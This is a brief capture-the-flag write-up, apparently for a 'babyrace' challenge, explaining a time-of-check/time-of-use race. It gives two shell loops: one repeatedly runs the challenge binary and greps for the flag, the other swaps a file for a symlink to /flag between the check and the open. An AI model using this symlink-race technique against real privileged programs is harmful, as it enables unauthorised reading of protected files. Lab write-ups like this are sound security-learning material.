The binary reads a file and prints it if it doens't contain flag and isn't a symlink.
We can trick it into reading the flag by creating a valid file and quickly replacing it with a symlink to the flag after it checks 
the file meets the conditions but before it opens the file. 

Running both of these scripts simulateneously will take advantage of the race condition.

```
 while true; do /babyrace_level1_testing1 ~/a > /tmp/out; grep pwn /tmp/out; done
 ```
 
 ```
#!/bin/sh
while true
do
        rm -rf ~/a
        touch ~/a
        rm -rf ~/a
        ln -s /flag ~/a
done
 ```
